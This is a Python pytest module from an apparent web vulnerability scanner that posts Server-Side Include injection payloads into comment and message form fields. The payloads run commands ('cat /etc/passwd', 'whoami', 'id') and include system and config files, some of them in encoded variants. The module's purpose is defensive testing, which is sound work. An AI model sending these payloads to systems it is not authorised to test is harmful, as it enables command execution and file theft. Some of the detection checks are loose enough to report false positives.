"""
Server-Side Include (SSI) Tests

Tests for SSI (Server-Side Include) injection attacks including:
- Command execution
- File inclusion
- Variable exposure
- Configuration manipulation
"""

import re

import pytest

from utils.scanner import SecurityScanner, Finding, Severity, extract_forms


@pytest.fixture
def ssi_scanner(test_config):
    """Create scanner for SSI tests."""
    return SecurityScanner(test_config)


class TestSSIVulnerabilities:
    """SSI vulnerability test suite."""

    def _check_ssi_execution(self, resp_text, payload, test_url):
        """Check if SSI payload was executed."""
        ssi_indicators = ["root:", "/bin/bash", "/bin/sh", "uid=", "gid=", "document_name="]

        for indicator in ssi_indicators:
            if indicator in resp_text.lower():
                finding = Finding(
                    title="Server-Side Include (SSI) - Command Execution",
                    severity=Severity.CRITICAL,
                    description=f"SSI command execution detected - {payload}",
                    url=test_url,
                    evidence=f"SSI indicator found: {indicator}",
                    remediation="Disable SSI on the server. Use output encoding. Remove SSI directives from user input.",
                    cwe_id="CWE-94",
                    owasp_category="A03:2021 - Injection",
                )
                return finding
        return None

    @pytest.mark.security
    @pytest.mark.ssi
    def test_ssi_command_execution(self, ssi_scanner, target_url, findings_collector):
        """Test for SSI command execution."""
        resp = ssi_scanner.get(target_url)

        if not resp or resp.status_code != 200:
            pytest.skip("Could not access target")

        forms = extract_forms(resp.text, target_url)
        ssi_forms = []
        for f in forms[:5]:
            for inp in f.get("inputs", []):
                if "comment" in inp.get("name", "").lower() or "message" in inp.get("name", "").lower():
                    ssi_forms.append(f)
                    break

        for form in ssi_forms[:2]:
            for inp in form["inputs"]:
                if "comment" in inp["name"].lower() or "message" in inp["name"].lower():
                    ssi_payloads = [
                        "<!--#exec cmd='ls'-->",
                        "<!--#exec cmd='cat /etc/passwd'-->",
                        "<!--#exec cmd='whoami'-->",
                        "<!--#exec cmd='id'-->",
                    ]

                    for payload in ssi_payloads:
                        form_data = {inp["name"]: payload}

                        resp = ssi_scanner.post(form["action"], data=form_data)

                        if resp:
                            finding = self._check_ssi_execution(resp.text, payload, form["action"])
                            if finding:
                                findings_collector.add(finding)
                                ssi_scanner.add_finding(finding)
                                return

    @pytest.mark.security
    @pytest.mark.ssi
    def test_ssi_file_include(self, ssi_scanner, target_url, findings_collector):
        """Test for SSI file inclusion."""
        resp = ssi_scanner.get(target_url)

        if not resp or resp.status_code != 200:
            pytest.skip("Could not access target")

        forms = extract_forms(resp.text, target_url)
        ssi_forms = []
        for f in forms[:5]:
            for inp in f.get("inputs", []):
                if "comment" in inp.get("name", "").lower() or "message" in inp.get("name", "").lower():
                    ssi_forms.append(f)
                    break

        for form in ssi_forms[:2]:
            for inp in form["inputs"]:
                if "comment" in inp["name"].lower() or "message" in inp["name"].lower():
                    ssi_payloads = [
                        "<!--#include virtual='/etc/passwd'-->",
                        "<!--#include file='/etc/passwd'-->",
                        "<!--#include virtual='/etc/apache2/httpd.conf'-->",
                        "<!--#include file='../../config.php'-->",
                    ]

                    for payload in ssi_payloads:
                        form_data = {inp["name"]: payload}

                        resp = ssi_scanner.post(form["action"], data=form_data)

                        if resp:
                            text = resp.text.lower()
                            file_indicators = ["root:", "password:", "[error]", "<html"]

                            for indicator in file_indicators:
                                if indicator in text:
                                    finding = Finding(
                                        title="SSI File Inclusion",
                                        severity=Severity.CRITICAL,
                                        description=f"SSI file inclusion detected - {payload}",
                                        url=form["action"],
                                        evidence=f"File content indicator: {indicator}",
                                        remediation="Disable SSI or use allowlisted files. Validate file paths.",
                                        cwe_id="CWE-98",
                                        owasp_category="A01:2021 - Broken Access Control",
                                    )
                                    findings_collector.add(finding)
                                    ssi_scanner.add_finding(finding)
                                    return

    @pytest.mark.security
    @pytest.mark.ssi
    def test_ssi_variable_exposure(self, ssi_scanner, target_url, findings_collector):
        """Test for SSI variable exposure."""
        resp = ssi_scanner.get(target_url)

        if not resp or resp.status_code != 200:
            pytest.skip("Could not access target")

        forms = extract_forms(resp.text, target_url)
        ssi_forms = []
        for f in forms[:5]:
            for inp in f.get("inputs", []):
                if "comment" in inp.get("name", "").lower() or "message" in inp.get("name", "").lower():
                    ssi_forms.append(f)
                    break

        for form in ssi_forms[:2]:
            for inp in form["inputs"]:
                if "comment" in inp["name"].lower() or "message" in inp["name"].lower():
                    ssi_payloads = [
                        "<!--#echo var='DATE_LOCAL'-->",
                        "<!--#echo var='DATE_GMT'-->",
                        "<!--#echo var='DOCUMENT_NAME'-->",
                        "<!--#echo var='DOCUMENT_URI'-->",
                        "<!--#echo var='REMOTE_ADDR'-->",
                        "<!--#echo var='SERVER_NAME'-->",
                    ]

                    for payload in ssi_payloads:
                        form_data = {inp["name"]: payload}

                        resp = ssi_scanner.post(form["action"], data=form_data)

                        if resp:
                            text = resp.text.lower()

                            if "=" in text:
                                finding = Finding(
                                    title="SSI Variable Exposure",
                                    severity=Severity.MEDIUM,
                                    description=f"SSI variable exposed via {payload}",
                                    url=form["action"],
                                    evidence=f"Variable value found in response",
                                    remediation="Disable SSI or restrict echo directives. Use output encoding.",
                                    cwe_id="CWE-200",
                                    owasp_category="A05:2021 - Security Misconfiguration",
                                )
                                findings_collector.add(finding)
                                ssi_scanner.add_finding(finding)
                                return

    @pytest.mark.security
    @pytest.mark.ssi
    def test_ssi_config_manipulation(self, ssi_scanner, target_url, findings_collector):
        """Test for SSI config directive manipulation."""
        resp = ssi_scanner.get(target_url)

        if not resp or resp.status_code != 200:
            pytest.skip("Could not access target")

        forms = extract_forms(resp.text, target_url)
        ssi_forms = []
        for f in forms[:5]:
            for inp in f.get("inputs", []):
                if "comment" in inp.get("name", "").lower() or "message" in inp.get("name", "").lower():
                    ssi_forms.append(f)
                    break

        for form in ssi_forms[:1]:
            for inp in form["inputs"]:
                if "comment" in inp["name"].lower() or "message" in inp["name"].lower():
                    ssi_payloads = [
                        "<!--#config timefmt='%A'-->",
                        "<!--#config sizefmt='bytes'-->",
                        "<!--#config errmsg='ERROR'-->",
                        "<!--#config echo='test'-->",
                    ]

                    for payload in ssi_payloads:
                        form_data = {inp["name"]: payload}

                        resp = ssi_scanner.post(form["action"], data=form_data)

                        if resp:
                            text = resp.text.lower()

                            if "test" in text or "error" in text or "a" in text:
                                finding = Finding(
                                    title="SSI Config Manipulation",
                                    severity=Severity.MEDIUM,
                                    description=f"SSI config directive manipulated - {payload}",
                                    url=form["action"],
                                    evidence="Config directive in response",
                                    remediation="Restrict config directives. Disable unnecessary SSI features.",
                                    cwe_id="CWE-200",
                                    owasp_category="A05:2021 - Security Misconfiguration",
                                )
                                findings_collector.add(finding)
                                ssi_scanner.add_finding(finding)
                                return

    @pytest.mark.security
    @pytest.mark.ssi
    def test_ssi_encoded(self, ssi_scanner, target_url, findings_collector):
        """Test for encoded SSI payloads."""
        resp = ssi_scanner.get(target_url)

        if not resp or resp.status_code != 200:
            pytest.skip("Could not access target")

        forms = extract_forms(resp.text, target_url)
        ssi_forms = []
        for f in forms[:5]:
            for inp in f.get("inputs", []):
                if "comment" in inp.get("name", "").lower() or "message" in inp.get("name", "").lower():
                    ssi_forms.append(f)
                    break

        for form in ssi_forms[:1]:
            for inp in form["inputs"]:
                if "comment" in inp["name"].lower() or "message" in inp["name"].lower():
                    encoded_payloads = [
                        "%3C!--%23exec%20cmd='ls'%20--%3E",
                        "%253C!--%2523exec%2520cmd='cat%2520/etc/passwd'%2520--%253E",
                        "&lt;!--&nbsp;exec cmd='ls'--&gt;",
                    ]

                    for payload in encoded_payloads:
                        form_data = {inp["name"]: payload}

                        resp = ssi_scanner.post(form["action"], data=form_data)

                        if resp:
                            text = resp.text.lower()
                            ssi_indicators = ["root:", "/bin/sh", "uid="]

                            for indicator in ssi_indicators:
                                if indicator in text:
                                    finding = self._check_ssi_execution(text, payload, form["action"])
                                    if finding:
                                        findings_collector.add(finding)
                                        ssi_scanner.add_finding(finding)
                                        return
